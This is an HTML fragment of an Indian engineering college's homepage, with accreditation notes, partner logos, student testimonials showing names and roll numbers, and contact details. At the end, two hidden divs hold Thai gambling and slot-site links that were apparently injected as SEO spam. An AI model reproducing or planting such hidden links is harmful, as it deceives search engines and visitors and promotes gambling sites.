              </span>
              <h4 class="service-heading">MOODLE</h4>
              <p class="text-muted"> Moodle (Modular Object-Oriented Dynamic Learning Environment) is an Open-Source learning Platform for blended Pedagogical Principles & E-Learning aspects. It’s a methodology of aspects ranging from assignments to feedback to forum and glossary.</p>
            </a>
          </div> -->
          <div class="col-md-2">
            <a href="https://info.aec.edu.in/acet/" target="new">
              <span class="fa-stack fa-4x">
                <img src="logos/key_features/parentlogin.png" style="width:100px; height:100px;">
              </span>
              <h4 class="service-heading">PARENT'S LOGIN</h4>
              <!-- <p class="text-muted">Libraries are the roots deep embedded of this humongous “Aditya” sharing its Wisdom & Knowledge. It has a vast and eclectic collection of books, journals, databases, audio-visual aids, CDs, DVDs, e-books, project reports, course material, classics and bound volumes of earlier examination papers.</p> -->
            </a>
          </div>
        </div>
      </center>
    </div>
  </div>
  <!-- End of Features -->


<div class="row centered features " style="background: rgb(10, 93, 134); margin-top:-112px">
    <br>
    <div id="features" class="container text-center" >
      <center>
        <br><br/>
        <div class="row text-center">

          <div class="col-md-4">
            <img src="logos/accreditation/accreditions.jpg" class="img-responsive">
            <h2 style="color: white">AFFILIATION AND ACCREDITATION</h2>
            <p>Approved by AICTE <br>Permanently Affiliated to JNTU Kakinada.<BR><a href="uploads/ACET.jpg" target="_blank" style="color: lightblue">ISO Certified.</a></p>
          </div>

          <div class="col-md-4">
            <img src="logos/accreditation/ugc.png" style="width:260px; height: auto;">
            <h2 style="color: white">UGC</h2>
          </div>

          <div class="col-md-4">
            <img src="logos/accreditation/naacfinal.jpg"  class="img-responsive">
            <h2 style="color: white">NAAC <a href="uploads/AQAR17-18.pdf" target='_blank' style="color: lightblue">(AQAR 2017-18)</a> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <a href="uploads/AQAR16-17.pdf" target='_blank' style="color: lightblue">(AQAR 2016 -17)</a></h2>
            <p>Accredited by National Assessment.</p>
            <p>Accredited by IAO</p>
          </div>
        </div>
      </center>
    </div>
  </div>




  


    <div class="row" style="background: #fff;">
      <div class="col-md-4">
        <section id="carousel" style="padding-bottom: 0">
          <h3 class="text-divider bg-info" style="padding: 0;margin: 0;margin-bottom: 30px"><strong><span>MOU's</span></strong></h3>
          <div class="row" >
            <a href="?p=Industry-Immersions" style="text-decoration: none;">
              <!-- <div class="quote"><i class="fa fa-quote-left fa-4x"></i></div> -->
              <div class="carousel slide" id="fade-quote-carousel1" data-ride="carousel" data-interval="3000">
                <!-- Carousel indicators -->
                <ol class="carousel-indicators">
                  <li data-target="#fade-quote-carousel1" data-slide-to="0" class="active"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="1"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="2"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="3"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="4"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="5"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="6"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="7"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="8"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="9"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="10"></li>
                  <li data-target="#fade-quote-carousel1" data-slide-to="11"></li>
                  
                </ol>
                <!-- Carousel items -->
                <div class="carousel-inner">

                  <div class="item active">
                    <blockquote>
                      <img src="logos/mou/cisco2.png" style="width:133px;" draggable="false">
                      <h2 style="font-size: 27px;">CISCO</h2>
                      <p>Newtworking Academy</p>
                      <p>Training on CISCO Certified Networking Association Certification.</p>
                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/redhat.png" style="width:250px;" draggable="false">
                      <h2 style="color: ;font-size: 18px;">Red Hat Academy</h2>

                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/camptia_small.png" style="width:250px;" draggable="false">
                      <h2 style="color: ;font-size: 18px;">Comptia Academy partner</h2>

                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/white copy 2.jpg" style="width:250px;" draggable="false">
                      <!-- <h2 style="color: ;font-size: 18px;">SAP</h2> -->
                      <p>Training on SAP certified courses on the campus.</p>

                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/dellemc.png" style="width:250px;" draggable="false">
                      <h2 style="color: ;font-size: 18px;">Dell EMC</h2>

                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/APSSDC.png" style="width:250px;" draggable="false">
                      <h2 style="color: ;font-size: 18px;">APSSDC CENTER OF EXCELLENCE</h2>

                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/automation.png" style="width:250px;" draggable="false">
                      <h2 style="color: ;font-size: 18px;">Automation Anywhere</h2>

                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/salesforce_assocation.jpg" style="width:250px;" draggable="false">
                      <h2 style="color: ;font-size: 18px;">Salesforce</h2>

                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/certiport.png" style="width:250px;" draggable="false">
                      <h2 style="color: ;font-size: 18px;">Certiport</h2>

                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/oracle.png" style="width:250px;" draggable="false">
                      <h2 style="color: ;font-size: 18px;">Oracle</h2>

                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/aws_educate.jpg" style="width:250px;" draggable="false">
                      <h2 style="color: ;font-size: 18px;">AWS Educate</h2>

                    </blockquote>
                  </div>

                  <div class="item">
                    <blockquote>
                      <img src="logos/mou/NCSSS LOGO.png" style="width:250px;" draggable="false">
                      <h2 style="color: ;font-size: 20px;">NATIONAL CYBER SAFETY AND SECURITY STANDARDS</h2>

                    </blockquote>
                  </div>
                </div>
              </div>
            </a>
          </div>
        </section>
        <!-- <h3 class="text-divider"><strong><span><a href="?p=Industry-Immersions">+ more</a></span></strong></h3> -->
      </div>
      <div class="col-md-8">
        <div class="row">
          <div class="col-md-12">
            <br><br>
            <h3 class="text-divider bg-info" style="padding: 0;margin: -9px;margin-bottom: 30px"><strong><span>Students Testimonials </span></strong></h3>
            <div id="testimonial-slider" class="owl-carousel">
                              <div class="testimonial">
                  <div class="testimonial-content fa fa-quote">
                    <p class="description">
                      Attending Aditya College of Engineering and Technology for my B.Tech in Electronics has been a total game-changer! Not only am diving deep into the world of electronics, but also leveling up my cognitive skills and coding abilities. The faculty here is top-notch, and they've got a hands-on approach to learning that's made all the difference.
Moreover, the supportive and collaborative community at Aditya institutions has been a constant source of inspiration. 
If you really want to do engineering and want to take your skills to the next level, this college is where it's at and "Highly recommend !"                    </p>
                  </div>
                  <div class="testimonial-profile">
                    <div class="pic">
                      <img src="ACET/testimonials/20P31A04E2.jpeg" alt="">
                    </div>
                    <h3 class="title">
                      K. Lakshmi Sravanthi                      <span class="post">20P31A04E2</span>
                    </h3>
                  </div>
                </div>
                              <div class="testimonial">
                  <div class="testimonial-content fa fa-quote">
                    <p class="description">
                      It is my pleasure for the four years spent at this institution have transformed my personality, honed my skills. College life is an important phase in a student's journey.Faculty here are highly experienced as well as motivating. The College is filled with positive energy and exuberance.They were always ready to clear all our doubts and ready to clear them now as well. The faculty members put their trust on the students to the fullest and continuously support us to reach heights.Besides that, this College gave me sweet memories, faithful friends and sense of confidence to face the challenges and turbulence in life.                    </p>
                  </div>
                  <div class="testimonial-profile">
                    <div class="pic">
                      <img src="ACET/testimonials/21P35A0513.jpeg" alt="">
                    </div>
                    <h3 class="title">
                      P. Deepthi Prasanna                      <span class="post">21P35A0513</span>
                    </h3>
                  </div>
                </div>
                              <div class="testimonial">
                  <div class="testimonial-content fa fa-quote">
                    <p class="description">
                      Being a part of Aditya College of Engineering & Technology has been an extraordinary journey. Our curriculum featured innovative teaching methods that transformed my academic experience. The faculty's commitment to excellence and real-world relevance has enhanced my skills for the professional arena. State-of-the-art facilities, workshops, and specialized training in emerging technologies have equipped me with a competitive edge. The college's focus on holistic development goes beyond textbooks, fostering a vibrant cultural scene that adds color to our campus life. The support from the Technical Hub introduced by our college includes an extensive library for emerging technology, fueling my intellectual curiosity. Proud to be a part of this learning ecosystem!                    </p>
                  </div>
                  <div class="testimonial-profile">
                    <div class="pic">
                      <img src="ACET/testimonials/WhatsApp Image 2024-01-12 at 11.32.19 AM.jpeg" alt="">
                    </div>
                    <h3 class="title">
                      YSS Tejaswini Thambabathula                      <span class="post">20P31A01233</span>
                    </h3>
                  </div>
                </div>
                              <div class="testimonial">
                  <div class="testimonial-content fa fa-quote">
                    <p class="description">
                      As a student at Aditya College, I take immense pride in being a part of this distinguished knowledge hub. The institution boasts top-notch laboratory facilities, engaging technical fests, insightful seminars, and enriching guest lectures, all of which have significantly contributed to enhancing my technical acumen. The college's commitment to providing experienced faculty, tailored training programs, and workshops for acquiring technical knowledge underscores its dedication to preparing students for the job market. Beyond academics, Aditya College fosters a vibrant cultural environment through diverse programs, adding a colorful dimension to our student life. Overall, Aditya College stands out as a comprehensive educational institution that prioritizes both academic excellence and holistic development.                    </p>
                  </div>
                  <div class="testimonial-profile">
                    <div class="pic">
                      <img src="ACET/testimonials/WhatsApp Image 2024-01-12 at 11.23.04 AM.jpeg" alt="">
                    </div>
                    <h3 class="title">
                      D Jyothi Sravani                      <span class="post">20P31A1212</span>
                    </h3>
                  </div>
                </div>
                              <div class="testimonial">
                  <div class="testimonial-content fa fa-quote">
                    <p class="description">
                      It is my pleasure for the four years spent at this institution have transformed my personality, honed my skills. College life is an important phase in a student's journey.Faculty here are highly experienced as well as motivating. The College is filled with positive energy and exuberance.They were always ready to clear all our doubts and ready to clear them now as well. The faculty members put their trust on the students to the fullest and continuously support us to reach heights.Besides that, this College gave me sweet memories, faithful friends and sense of confidence to face the challenges and turbulence in life.                    </p>
                  </div>
                  <div class="testimonial-profile">
                    <div class="pic">
                      <img src="ACET/testimonials/WhatsApp Image 2024-01-11 at 9.02.39 PM.jpeg" alt="">
                    </div>
                    <h3 class="title">
                      G Harshitha rayudu                      <span class="post">20P31A0516</span>
                    </h3>
                  </div>
                </div>
                              <div class="testimonial">
                  <div class="testimonial-content fa fa-quote">
                    <p class="description">
                      My deepest gratitude goes to my college for their unwavering support throughout my academic journey, from the moment I stepped onto campus to the successful conclusion of my training and placement process. I'm particularly thrilled to have landed a placement in the exciting field of artificial intelligence, a testament to the exceptional guidance and preparation I received.                    </p>
                  </div>
                  <div class="testimonial-profile">
                    <div class="pic">
                      <img src="ACET/testimonials/WhatsApp Image 2024-01-11 at 9.00.14 PM.jpeg" alt="">
                    </div>
                    <h3 class="title">
                      Pennada Venkata Chaitanya                      <span class="post">20P31A0548</span>
                    </h3>
                  </div>
                </div>
                              <div class="testimonial">
                  <div class="testimonial-content fa fa-quote">
                    <p class="description">
                      My journey from trainee to placed professional wouldn't have been possible without My College. From the outset, their comprehensive training and dedicated placement team provided invaluable support. I'm particularly grateful for the guidance that led me to secure a placement in my desired field of full-stack development. I owe my success to their unwavering commitment and expertise.                    </p>
                  </div>
                  <div class="testimonial-profile">
                    <div class="pic">
                      <img src="ACET/testimonials/WhatsApp Image 2024-01-11 at 8.57.44 PM.jpeg" alt="">
                    </div>
                    <h3 class="title">
                      Nadimpalli Suryakala                      <span class="post">20P31A0538</span>
                    </h3>
                  </div>
                </div>
                              <div class="testimonial">
                  <div class="testimonial-content fa fa-quote">
                    <p class="description">
                      I am incredibly grateful for the unwavering support which I received from my college and THub. The academic environment at the college provided me with valuable knowledge and skills, while I the enthusiastic to think and learn about new things. Our College "Aditya College Of Engineering And Technology" has provided me with valuable knowledge and skills, while the enthusiastic thumbs-up from friends, professors, and mentors motivated me to strive for excellence. I owe a significant part of my success to the uplifting community at my college and the constant encouragement by our trainers of "PEGA" which was organized by Technical Hub. The dedicated faculty and the vibrant academic community at the college played a crucial role in shaping my academic and personal growth. Their guidance, encouragement, and nurturing environment fostered a mindset of continuous learning and excellence. I am grateful for the opportunities and the solid foundation provided by my college, which have been instrumental in my journey towards achieving success.                    </p>
                  </div>
                  <div class="testimonial-profile">
                    <div class="pic">
                      <img src="ACET/testimonials/20P31A0520.JPG" alt="">
                    </div>
                    <h3 class="title">
                      I V Surya Kalanjali                      <span class="post">20P31A0520</span>
                    </h3>
                  </div>
                </div>
                              <div class="testimonial">
                  <div class="testimonial-content fa fa-quote">
                    <p class="description">
                      Achieving my dream wouldn't have been possible without the support of Aditya. In my view, reaching one's goals requires not only hard work and determination but also a supportive environment. As a student at Aditya, I am grateful to be part of a nurturing environment that offers experienced faculty, specialized training programs, an excellent placement team, and top-notch infrastructure with labs and libraries to acquire essential skill sets. Beyond academics, our college organizes various cultural programs and seminars, creating a perfect balance in student lifestyle and providing wonderful moments. These activities contribute to a well-rounded education, fostering personal growth and a sense of community.                    </p>
                  </div>
                  <div class="testimonial-profile">
                    <div class="pic">
                      <img src="ACET/testimonials/WhatsApp Image 2024-01-24 at 3.37.55 PM.jpeg" alt="">
                    </div>
                    <h3 class="title">
                      Vamsi Thadi                      <span class="post">21P35A0363</span>
                    </h3>
                  </div>
                </div>
                              <div class="testimonial">
                  <div class="testimonial-content fa fa-quote">
                    <p class="description">
                      Being part of Aditya College of Engineering and Technology has been an incredible journey. Our curriculum incorporates innovative teaching techniques, enhancing my academic experience. The faculty's commitment to quality and practical application has significantly improved my professional abilities. The college's holistic development focus extends beyond the curriculum, fostering a vibrant cultural environment that enriches our time on campus. The Technical Hub's assistance, including a comprehensive library on emerging technology, has stimulated my intellectual curiosity. I take pride in being part of this dynamic learning community, and I'm pleased to share that the Technical Hub played a crucial role in helping me in achieving success as a front-end developer, further highlighting the valuable skills I've gained during my time at the college.                    </p>
                  </div>
                  <div class="testimonial-profile">
                    <div class="pic">
                      <img src="ACET/testimonials/WhatsApp Image 2024-01-25 at 11.38.47 AM.jpeg" alt="">
                    </div>
                    <h3 class="title">
                      J Sanjay                      <span class="post">20P31A0589</span>
                    </h3>
                  </div>
                </div>
                          </div>
          </div>
        </div>
      </div>

</div>




  </div>
  

</section>
</div>
<!-- </div> -->
<!-- End of AAA -->



<!--testimonials js-->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/owl-carousel/1.3.3/owl.carousel.min.js"></script>

<script>
 $(document).ready(function(){
    $("#testimonial-slider").owlCarousel({
        items:1,
        itemsDesktop:[1000,1],
        itemsDesktopSmall:[990,1],
        itemsTablet:[768,1],
        itemsMobile:[650,1],
        pagination:true,
        navigation:false,
        autoPlay:true
    });
});
</script>
<!--testimonials js end-->












<div class="container-fluid">
  <div class="col-md-4 col-md-offset-4"><h3 class="text-divider bg-info" style="padding: 0;margin: 0;margin-top: 30px"><strong><span>OUR LEADING RECRUITERS </span></strong></h3></div>
  <div class="clearfix" style="clear: both;"></div><br><br>

  <div class="col-md-2">
    <img src="logos/companylogos/btech/aws.png" draggable="false" class="img-thumbnail" style="min-width: 200px">
  </div>
  <marquee style="padding-top: 0px;margin-top: -00px" class="col-md-8"><br>
    <img src="logos/companylogos/btech/1.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px;">
    <img src="logos/companylogos/btech/2.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px;">
    <img src="logos/companylogos/btech/3.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px;">
    <img src="logos/companylogos/btech/4.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px;">
    <img src="logos/companylogos/btech/5.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px;">
    <img src="logos/companylogos/btech/6.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px;">
    <img src="logos/companylogos/btech/7.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px;">
    <img src="logos/companylogos/btech/8.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px;">
    <img src="logos/companylogos/btech/9.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px;">
    <img src="logos/companylogos/btech/10.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/11.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/12.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/13.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/14.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/15.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/16.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/17.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/18.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/19.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/20.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/21.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/22.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/23.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/24.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/25.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/26.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/21.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/22.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/23.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/24.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/25.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/26.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/27.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/28.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/29.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/30.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/31.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/32.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/33.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/34.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/35.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/36.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/37.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/38.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/39.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/40.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/41.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/42.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/43.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
    <img src="logos/companylogos/btech/45.png" draggable="false" style="width: auto;padding: 0 30px;height: 60px">
  </marquee>
              <div class="" style="padding-top:30px; padding-bottom:0px;"> 
                    <center>
                        <a href="?p=Recruiters"><button class="btn btn-danger text-center" style="width:160px;background-color:#fd752c;font-family:Roboto,sans-serif;"><b>VIEW ALL</b></button></a>
                    </center>
                </div>
</div>

<script type="text/javascript">

    // var colors = ["#227C70", "#FFBF00"];
    // // var colors = ["#227C70", "#FFBF00","#0002A1"];

    // var id = null;
    // function frame() {
    //     confetti({
    //         particleCount: 2,
    //         angle: 60,
    //         spread: 55,
    //         origin: { x: 0 },
    //         colors: colors,
    //     });
    //     confetti({
    //         particleCount: 2,
    //         angle: 120,
    //         spread: 55,
    //         origin: { x: 1 },
    //         colors: colors,
    //     });

    //     if (Date.now() < Date.now() + 15000) {
    //         id =  requestAnimationFrame(frame);
    //     }
    // }

    // window.onload = frame();
    

    // $(document).ready(function() {
           
    //     $("#b-close").click(function() {
    //         // alert("page is loaded");
    //         $(".popup_this_container").hide();
    //         window.cancelAnimationFrame(id);
    //     });
    // });
</script>







        <!-- Footer Area Start Here -->
        <footer>
            <div class="footer-area-top">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
                            <div class="footer-box">
                                <a href="index.php"><img class="img-responsive" src="logos/LOGO3.png" alt="logo"></a>
                                <div class="footer-about">
                                </div>
                                <center>
                                    <ul class="footer-social">
                                        <li>
                                           <a href="https://www.facebook.com/ACETaditya" target="_blank"><i class="fa fa-facebook" aria-hidden="true" style="color: #fff;"></i>
                                           </a>
                                       </li>
                                       <li>
                                           <a href="https://twitter.com/adityaedugroup" target="_blank"><i class="fa fa-twitter" aria-hidden="true" style="color: #fff;"></i>
                                           </a>
                                       </li>
                                       <li>
                                           <a href="https://www.youtube.com/channel/UCQmzQy9b4i6Q6X86DkX1H1g" target="_blank"><i style="font-size:20px;color: #fff" class="fa" aria-hidden="true">&#xf167;</i>
                                           </a>
                                       </li>
                                       <li>
                                           <a href="https://api.whatsapp.com/send?phone=+91 7036076661"  target="_blank"><i style="font-size:20px;color: #fff" class="fa" aria-hidden="true">&#xf232;</i>
                                           </a>
                                       </li>
                                       <li><a href="http://instagram.com/aditya_engg_colleges"  target="_blank"><i class="fa fa-instagram" aria-hidden="true" style="font-size:20px;color: #fff"></i></a></li>

                                   </ul>
                               </center>

                           </div>
                       </div>

                       <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 pull-right">
                          <div class="footer-box">
                            <h6 class="heading7 ">REACH US HERE:</h6>
                              <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d9414.831525214788!2d82.0642407485749!3d17.092078454565375!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3a3783fb51c01193%3A0x7fae7b68791addee!2sAditya+college+of+engineering+and+technology!5e1!3m2!1sen!2sin!4v1542256919701" width="auto" height="250" frameborder="0" style="border:0" allowfullscreen></iframe>             
                           </div>
                     </div>

                       <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 pull-right">
                        <div class="footer-box ">
                         <p><i class="glyphicon glyphicon-map-marker"></i> ADITYA COLLEGE OF<br> ENGINEERING & TECHNOLOGY <br>Aditya Nagar, ADB Road, <br>Surampalem - Pin:533437 <br>East-Godavari District,<br>Andhra Pradesh, <br>INDIA. </p>
                         <p><i class="glyphicon glyphicon-phone"></i> Phone (India) :<br>0884-2326212,9959176665
                         <p><i class="glyphicon glyphicon-phone"></i> Whats App : +91 7036076661</p>
                         <!-- <p><i class="glyphicon glyphicon-print"></i> Fax : 0884-2326203</p> -->
                         <!-- <p><i class="glyphicon glyphicon-envelope text-left"></i> E-mail : adityacollegeenggtech@gmail.com</p> -->
                         <p><i class="glyphicon glyphicon-envelope text-left"></i> E-mail : office@acet.ac.in</p>
                     </div>
                 </div>

                 <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12 pull-right">
                    <div class="footer-box">
                        <h6 class="heading7 ">OFFICES</h6>
                        <div class="regional fa-ul">
                           <p><a href="?p=office#office"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>Corporate office</a></p>
                           <p><a href="?p=Admissions#Admissions"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>International Admissions</a></p>

                           <p><a href="?p=Bihar#Bihar"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>Bihar</a></p>
                           <p><a href="?p=Jharkand#Jharkand"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>Jharkhand</a></p>
                           <p><a href="?p=Kerala#Kerala"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>Kerala</a></p>
                           <p><a href="?p=Bangladesh#Bangladesh"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>Bangladesh</a></p>
                           <p><a href="?p=West Bengal#West Bengal"><i class="fa-li fa fa-angle-double-right"  style="color: white"></i>West Bengal</a></p>
                       </div>
                   </div>
               </div>
           </div>

       </div>
       <div class="footer-area-bottom ">

    <div class="copyright" style="background-color: #001a39">
        <div class="container">
            <div class="col-md-12">
                <p style="float: left; margin-top: 15px"><b>Aditya College Engineering & Technology</b> © 2020 - All Rights Reserved.</p><p style="float: right;" ><b>Powered By</b> &nbsp;&nbsp;<a href="http://technicalhub.io/" target="new" class="myLinkClass" style="list-style:none;color:white;"id="thub"><img src="logos/T-Hub_logo.png" alt="" style="width:200px;height:50px;"></a></p>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
   </div>

  <!-- <div class="float3 navbar-fixed-bottom apply_admission_card" style="background-color: #fd752c;height: 60px;margin-bottom: 0px">
             <div class="container">
              <div class="col-md-12">
                 <div class="col-md-2">
                 <a href="https://api.whatsapp.com/send?phone=+919553649666 & test=Hi! I am Interested to take admission in ADITYA. Can you guide me through admission process? " class="float1" target="_blank">
          <i class="fa fa-whatsapp my-float"></i> </a>
               </div>
                <div class="col-md-offset-2 col-md-8 apply_admission" >
                  <p style="float: center;color: white;line-height:5px ;"><b class="name">APPLY FOR ADMISSIONS 2021&nbsp;&nbsp;</b>&nbsp;&nbsp;&nbsp;<button class="login_btn1"><a href="https://aditya.ac.in/admission/" target="_blank" style="color: white;"><b>Join Today</b></a></button></p>
                 </div>
                   <div class="col-md-2">
                   <a href="https://www.facebook.com/AdityaEngineeringColleges" target="_blank" class="float2" title="Welcome to Aditya">
                   <img src="logos/fb.png" style="width:63px;" alt="fb_messenger">
                </a>
                </div>
               </div>
      </div>
    </div>
 -->

        <link rel="stylesheet" href="whatsapp/floating-wpp.css">
        <script type="text/javascript" src="whatsapp/floating-wpp.js"></script>

</footer>
    <div class="container" style="width: 70%">
      <div class="float3 navbar-fixed-bottom apply_admission_card" style="background-color: #fd752c;height: 60px;margin-bottom: 0px">
       <div class="container">
        <div class="row">
         <div class="col-md-1">
          <div id="myButton" class="btn_wtp"> </div>
        </div>
        <div class="col-md-6 col-md-offset-2 hidden-sm hidden-xs apply_admission" >
          <p style="color: white;line-height:1.6px ;" class="text-center "><b class="name">&nbsp;APPLY FOR ADMISSIONS&nbsp;&nbsp;</b>&nbsp;&nbsp;&nbsp;<button class="login_btn1"><a href="https://aec.edu.in/admission/" target="_blank" style="color: white;"><b>Join Today</b></a></button></p>
        </div>

        <div class="col-md-6 col-md-offset-2 hidden-md hidden-lg apply_admission" >
          <p style="color: white;line-height:1.6px ;" class="text-center"><b class="name">&nbsp;APPLY FOR ADMISSIONS</b>&nbsp;&nbsp;&nbsp;<br/><button class="login_btn1"><a href="https://aec.edu.in/admission/" target="_blank" style="color: white;"><b>Join Today</b></a></button></p>
        </div>


        <div class="col-md-1">
         <a href="https://www.facebook.com/ACETaditya" target="_blank" class="float2" title="Welcome to Aditya">
           <img src="logos/fb.png" style="width:64px;" alt="fb_messenger"/>
         </a>
       </div>
     </div>
   </div>
 </div>
</div>
</div>


<div style="display:none;">
<p><a href="https://pafinarchy.org/">สล็อต PG</a></p>
<p><a href="https://r4shub.com/">สล็อต PG</a></p>
<p><a href="https://2ez4me.us/">สล็อต PG</a></p>
<p><a href="https://fkunud.com/">สล็อต PG</a></p>
<p><a href="https://www.it.kgmu.org/">สล็อต PG</a></p>
<p><a href="https://foomoo.vip/">สล็อต PG</a></p>
<p><a href="https://paaree.vip/">สล็อต PG</a></p>
<p><a href="https://forbali.org/">สล็อต PG</a></p>
<p><a href="https://bali-bird-park.com/">สล็อต PG</a></p>
<p><a href="https://ziuma.com/">สล็อต PG</a></p>
<p><a href="https://posmerdeka.com/">สล็อต PG</a></p>
<p><a href="https://pg.netway.co.th/">สล็อต PG</a></p>
<p><a href="https://pgslot.netway.co.th/">สล็อต PG</a></p>
</div>

<div style="display:none;">
<p><a href="https://pafinarchy.org/">บาคาร่า</a></p>
<p><a href="https://r4shub.com/">คาสิโนออนไลน์</a></p>
<p><a href="https://2ez4me.us/">สล็อต</a></p>
<p><a href="https://fkunud.com/">สล็อตที่ดีที่สุด</a></p>
<p><a href="https://www.it.kgmu.org/">สล็อต PG</a></p>
<p><a href="https://foomoo.vip/">คาสิโน</a></p>
<p><a href="https://paaree.vip/">เว็บตรง</a></p>
<p><a href="https://forbali.org/">เว็บอันดับหนึ่ง</a></p>
<p><a href="https://bali-bird-park.com/">แทงบาคาร่า</a></p>
<p><a href="https://ziuma.com/">โบนัสสล็อต</a></p>
<p><a href="https://posmerdeka.com/">สล็อตเครดิตฟรี</a></p>
<p><a href="https://pafim1ng.org/">สล็อตแตกง่าย</a></p>
<p><a href="https://pafi121area.org/">สล็อตใหม่ล่าสุด</a></p>
